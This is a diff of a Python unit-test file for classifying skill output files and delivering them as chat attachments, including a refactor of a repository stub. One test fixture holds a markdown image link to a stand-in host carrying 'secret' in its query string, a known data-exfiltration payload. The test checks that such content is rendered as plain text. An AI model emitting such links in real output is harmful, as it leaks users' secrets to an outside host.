@@ -16,14 +16,18 @@ from __future__ import annotations
 import uuid
 from collections.abc import Iterator
 from pathlib import Path
-from typing import Any
 from unittest.mock import patch
 
 import pytest
+from sqlalchemy.ext.asyncio import AsyncSession
 
+from src.core.conversation_target import ConversationRef
+from src.domains.attachments.file_contracts import FileWriteTicket, UploadMetadata
 from src.domains.attachments.models import AttachmentContentType, AttachmentOrigin
 from src.domains.skills.command_bundle import OutputFile
 from src.domains.skills.command_outputs import classify, deliver_outputs
+from tests.helpers.attachment_publication import AttachmentWriterStub
+from tests.helpers.run_authority import unit_run_authority
 
 pytestmark = pytest.mark.unit
 
@@ -74,24 +78,18 @@ class TestClassify:
         assert classify(OutputFile(name=name, data=data)) == reason
 
 
-class _Repo:
-    created: list[dict[str, Any]] = []
+class _Repo(AttachmentWriterStub):
+    created: list[dict[str, object]] = []
     fail = False
 
-    def __init__(self, db: Any) -> None:
-        pass
-
-    async def create(self, values: dict[str, Any]) -> Any:
-        if _Repo.fail:
-            raise RuntimeError("database down")
-        _Repo.created.append(values)
-        row = type("Row", (), {})()
-        row.id = uuid.uuid4()
-        row.expires_at = values["expires_at"]
-        return row
+    def __init__(self, db: AsyncSession) -> None:
+        super().__init__(_Repo.created, fail_stage=_Repo.fail)
 
 
 class _Db:
+    async def rollback(self) -> None:
+        return None
+
     async def commit(self) -> None:
         pass
 
@@ -110,8 +108,9 @@ def storage(tmp_path: Path) -> Iterator[Path]:
     from src.core.config import settings
 
     with (
+        unit_run_authority(_USER, uuid.UUID(_CONVERSATION), uuid.UUID(_RUNTIME)),
         patch.object(settings, "attachments_storage_path", str(tmp_path)),
-        patch("src.domains.skills.command_outputs.AttachmentRepository", _Repo),
+        patch("src.domains.attachments.file_publication.AttachmentFileRepository", _Repo),
         patch("src.domains.skills.command_outputs.get_db_context", _Context),
     ):
         yield tmp_path
@@ -119,6 +118,7 @@ def storage(tmp_path: Path) -> Iterator[Path]:
 
 _USER = uuid.UUID("11111111-1111-4111-8111-111111111111")
 _CONVERSATION = "22222222-2222-4222-8222-222222222222"
+_RUNTIME = "33333333-3333-4333-8333-333333333333"
 
 
 class TestDeliver:
@@ -131,6 +131,7 @@ class TestDeliver:
                 [OutputFile("r.pdf", _PDF), OutputFile("c.png", _PNG), OutputFile("x.exe", b"MZ")],
                 user_id=_USER,
                 conversation_id=_CONVERSATION,
+                delivery_runtime_id=_RUNTIME,
             )
         assert [(f.name, f.family) for f in delivery.delivered] == [
             ("r.pdf", "document"),
@@ -151,7 +152,7 @@ class TestDeliver:
         assert (storage / pdf["file_path"]).read_bytes() == _PDF
         # The pdf card opens in the browser's viewer; the markdown one as text.
         assert documents.call_args.args[1].doc_type == "pdf"
-        assert images.call_args.args[0] == _CONVERSATION
+        assert images.call_args.args[0] == _RUNTIME
 
     async def test_a_page_a_skill_wrote_is_shown_as_text(self, storage: Path) -> None:
         with (
@@ -162,6 +163,7 @@ class TestDeliver:
                 [OutputFile("notes.md", b"![x](https://evil/?q=secret)")],
                 user_id=_USER,
                 conversation_id=_CONVERSATION,
+                delivery_runtime_id=_RUNTIME,
             )
         card = documents.call_args.args[1]
         assert (card.filename, card.doc_type) == ("notes.md.txt", "txt")
@@ -170,11 +172,13 @@ class TestDeliver:
         import asyncio
 
         class _Cancelled(_Repo):
-            async def create(self, values: dict[str, Any]) -> Any:
+            async def stage_upload(
+                self, owner_id: uuid.UUID, metadata: UploadMetadata, target: ConversationRef | None
+            ) -> FileWriteTicket:
                 raise asyncio.CancelledError
 
         with (
-            patch("src.domains.skills.command_outputs.AttachmentRepository", _Cancelled),
+            patch("src.domains.attachments.file_publication.AttachmentFileRepository", _Cancelled),
             pytest.raises(asyncio.CancelledError),
         ):
             await deliver_outputs(
